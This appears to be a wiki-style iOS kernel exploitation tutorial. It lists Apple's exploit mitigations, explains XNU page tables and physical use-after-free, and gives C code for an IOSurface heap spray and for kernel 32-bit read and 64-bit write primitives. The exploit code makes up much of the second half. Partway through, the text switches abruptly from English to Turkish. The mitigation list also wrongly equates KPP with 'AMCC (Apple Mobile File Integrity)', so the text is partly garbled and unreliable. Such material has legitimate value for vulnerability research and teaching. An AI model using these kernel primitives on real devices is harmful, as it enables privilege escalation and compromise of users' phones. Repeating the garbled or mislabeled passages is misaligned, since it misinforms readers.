## iOS Exploit Mitigations

- **Code Signing** in iOS works by requiring every piece of executable code (apps, libraries, extensions, etc.) to be cryptographically signed with a certificate issued by Apple. When code is loaded, iOS verifies the digital signature against Apple’s trusted root. If the signature is invalid, missing, or modified, the OS refuses to run it. This prevents attackers from injecting malicious code into legitimate apps or running unsigned binaries, effectively stopping most exploit chains that rely on executing arbitrary or tampered code.
- **CoreTrust** is the iOS subsystem responsible for enforcing code signing at runtime. It directly verifies signatures using Apple’s root certificate without relying on cached trust stores, meaning only binaries signed by Apple (or with valid entitlements) can execute. CoreTrust ensures that even if an attacker tampers with an app after installation, modifies system libraries, or tries to load unsigned code, the system will block execution unless the code is still properly signed. This strict enforcement closes many post-exploitation vectors that older iOS versions allowed through weaker or bypassable signature checks.
- **Data Execution Prevention (DEP)** marks memory regions as non-executable unless they explicitly contain code. This stops attackers from injecting shellcode into data regions (like the stack or heap) and running it, forcing them to rely on more complex techniques like ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** randomizes the memory addresses of code, libraries, stack, and heap every time the system runs. This makes it much harder for attackers to predict where useful instructions or gadgets are, breaking many exploit chains that depend on fixed memory layouts.
- **KASLR (Kernel ASLR)** applies the same randomization concept to the iOS kernel. By shuffling the kernel’s base address at each boot, it prevents attackers from reliably locating kernel functions or structures, raising the difficulty of kernel-level exploits that would otherwise gain full system control.
- **Kernel Patch Protection (KPP)** also known as **AMCC (Apple Mobile File Integrity)** in iOS, continuously monitors the kernel’s code pages to ensure they haven’t been modified. If any tampering is detected—such as an exploit trying to patch kernel functions or insert malicious code—the device will immediately panic and reboot. This protection makes persistent kernel exploits far harder, as attackers can’t simply hook or patch kernel instructions without triggering a system crash.
- **Kernel Text Readonly Region (KTRR)** is a hardware-based security feature introduced on iOS devices. It uses the CPU’s memory controller to mark the kernel’s code (text) section as permanently read-only after boot. Once locked, even the kernel itself cannot modify this memory region. This prevents attackers—and even privileged code—from patching kernel instructions at runtime, closing off a major class of exploits that relied on modifying kernel code directly.
- **Pointer Authentication Codes (PAC)** use cryptographic signatures embedded into unused bits of pointers to verify their integrity before use. When a pointer (like a return address or function pointer) is created, the CPU signs it with a secret key; before dereferencing, the CPU checks the signature. If the pointer was tampered with, the check fails and execution stops. This prevents attackers from forging or reusing corrupted pointers in memory corruption exploits, making techniques like ROP or JOP much harder to pull off reliably.
- **Privilege Access never (PAN)** is a hardware feature that prevents the kernel (privileged mode) from directly accessing user-space memory unless it explicitly enables access. This stops attackers who gained kernel code execution from easily reading or writing user memory to escalate exploits or steal sensitive data. By enforcing strict separation, PAN reduces the impact of kernel exploits and blocks many common privilege-escalation techniques.
- **Page Protection Layer (PPL)** is an iOS security mechanism that protects critical kernel-managed memory regions, especially those related to code signing and entitlements. It enforces strict write protections using the MMU (Memory Management Unit) and additional checks, ensuring that even privileged kernel code cannot arbitrarily modify sensitive pages. This prevents attackers who gain kernel-level execution from tampering with security-critical structures, making persistence and code-signing bypasses significantly harder.

## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

The **virtual memory address space** for user processes on iOS spans from **0x0 to 0x8000000000**. However, these addresses don’t directly map to physical memory. Instead, the **kernel** uses **page tables** to translate virtual addresses into actual **physical addresses**.

#### Levels of Page Tables in iOS

Page tables are organized hierarchically in three levels:

1. **L1 Page Table (Level 1)**:
* Each entry here represents a large range of virtual memory.
* It covers **0x1000000000 bytes** (or **256 GB**) of virtual memory.
2. **L2 Page Table (Level 2)**:
* An entry here represents a smaller region of virtual memory, specifically **0x2000000 bytes** (32 MB).
* An L1 entry may point to an L2 table if it can't map the entire region itself.
3. **L3 Page Table (Level 3)**:
* This is the finest level, where each entry maps a single **4 KB** memory page.
* An L2 entry may point to an L3 table if more granular control is needed.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Some entries in a page table directly **map a range of virtual addresses** to a contiguous range of physical addresses (like a shortcut).
* **Pointer to Child Page Table**:
* If finer control is needed, an entry in one level (e.g., L1) can point to a **child page table** at the next level (e.g., L2).

#### Example: Mapping a Virtual Address

Let’s say you try to access the virtual address **0x1000000000**:

1. **L1 Table**:
* The kernel checks the L1 page table entry corresponding to this virtual address. If it has a **pointer to an L2 page table**, it goes to that L2 table.
2. **L2 Table**:
* The kernel checks the L2 page table for a more detailed mapping. If this entry points to an **L3 page table**, it proceeds there.
3. **L3 Table**:
* The kernel looks up the final L3 entry, which points to the **physical address** of the actual memory page.

#### Example of Address Mapping

If you write the physical address **0x800004000** into the first index of the L2 table, then:

* Virtual addresses from **0x1000000000** to **0x1002000000** map to physical addresses from **0x800004000** to **0x802004000**.
* This is a **block mapping** at the L2 level.

Alternatively, if the L2 entry points to an L3 table:

* Each 4 KB page in the virtual address range **0x1000000000 -> 0x1002000000** would be mapped by individual entries in the L3 table.

### Physical use-after-free

A **physical use-after-free** (UAF) occurs when:

1. A process **allocates** some memory as **readable and writable**.
2. The **page tables** are updated to map this memory to a specific physical address that the process can access.
3. The process **deallocates** (frees) the memory.
4. However, due to a **bug**, the kernel **forgets to remove the mapping** from the page tables, even though it marks the corresponding physical memory as free.
5. The kernel can then **reallocate this "freed" physical memory** for other purposes, like **kernel data**.
6. Since the mapping wasn’t removed, the process can still **read and write** to this physical memory.

This means the process can access **pages of kernel memory**, which could contain sensitive data or structures, potentially allowing an attacker to **manipulate kernel memory**.

### IOSurface Heap Spray

Since the attacker can’t control which specific kernel pages will be allocated to freed memory, they use a technique called **heap spray**:

1. The attacker **creates a large number of IOSurface objects** in kernel memory.
2. Each IOSurface object contains a **magic value** in one of its fields, making it easy to identify.
3. They **scan the freed pages** to see if any of these IOSurface objects landed on a freed page.
4. When they find an IOSurface object on a freed page, they can use it to **read and write kernel memory**.

> [!TIP]
> Be aware that iOS 16+ (A12+) devices bring hardware mitigations (like PPL or SPTM) that make physical UAF techniques far less viable.
> PPL enforces strict MMU protections on pages related to code signing, entitlements, and sensitive kernel data, so, even if a page gets reused, writes from userland or compromised kernel code to PPL-protected pages are blocked.
> Secure Page Table Monitor (SPTM) extends PPL by hardening page table updates themselves. It ensures that even privileged kernel code cannot silently remap freed pages or tamper with mappings without going through secure checks.
> KTRR (Kernel Text Read-Only Region), which locks down the kernel’s code section as read-only after boot. This prevents any runtime modifications to kernel code, closing off a major attack vector that physical UAF exploits often rely on.
> Moreover, `IOSurface` allocations are less predictable and harder to map into user-accessible regions, which makes the “magic value scanning” trick much less reliable. And `IOSurface` is now guarded by entitlements and sandbox restrictions.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: The attacker creates many IOSurface objects with a special identifier ("magic value").
2. **Scan Freed Pages**: They check if any of the objects have been allocated on a freed page.
3. **Read/Write Kernel Memory**: By manipulating fields in the IOSurface object, they gain the ability to perform **arbitrary reads and writes** in kernel memory. This lets them:
* Use one field to **read any 32-bit value** in kernel memory.
* Use another field to **write 64-bit values**, achieving a stable **kernel read/write primitive**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Bir serbest bırakılmış fiziksel sayfada **`IOSurface`** nesnelerini arayın:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface ile Kernel Okuma/Yazma Erişimi

IOSurface nesnesi üzerinde kontrol sağlandıktan sonra (kullanıcı alanından erişilebilen serbest bırakılmış bir fiziksel sayfaya eşlenmiş), bunu **herhangi bir kernel okuma ve yazma işlemi** için kullanabiliriz.

**Key Fields in IOSurface**

IOSurface nesnesinin iki kritik alanı vardır:

1. **Use Count Pointer**: Bir **32-bit okuma** sağlar.
2. **Indexed Timestamp Pointer**: Bir **64-bit yazma** sağlar.

Bu pointer'ları ezerek, onları kernel belleğindeki herhangi bir adrese yönlendiririz ve böylece okuma/yazma yeteneği elde ederiz.

#### 32-Bit Kernel Okuma

Okuma yapmak için:

1. **use count pointer**'ı hedef adresin 0x14 baytlık offset eksiğine işaret edecek şekilde overwrite edin.
2. Bu adresteki değeri okumak için `get_use_count` metodunu kullanın.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Bir yazma işlemi gerçekleştirmek için:

1. Hedef adrese **indexed timestamp pointer**'ı üzerine yazın.
2. 64-bit bir değeri yazmak için `set_indexed_timestamp` metodunu kullanın.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### İstismar Akışı Özeti

1. **Trigger Physical Use-After-Free**: Boşaltılmış sayfalar yeniden kullanım için mevcut hale gelir.
2. **Spray IOSurface Objects**: kernel memory'de benzersiz bir "magic value" içeren çok sayıda IOSurface nesnesi ayırın.
3. **Identify Accessible IOSurface**: Kontrolünüzdeki boşaltılmış bir sayfada bulunan bir IOSurface'i tespit edin.
4. **Abuse Use-After-Free**: IOSurface nesnesindeki işaretçileri değiştirerek IOSurface yöntemleri aracılığıyla rastgele **kernel read/write** sağlayın.

Bu primitiflerle exploit, kernel memory'ye kontrollü **32-bit reads** ve **64-bit writes** sağlar. İleri jailbreak adımları, daha stabil read/write primitifleri gerektirebilir; bu da ek korumaların (ör. yeni arm64e cihazlarda PPL) atlatılmasını gerektirebilir.
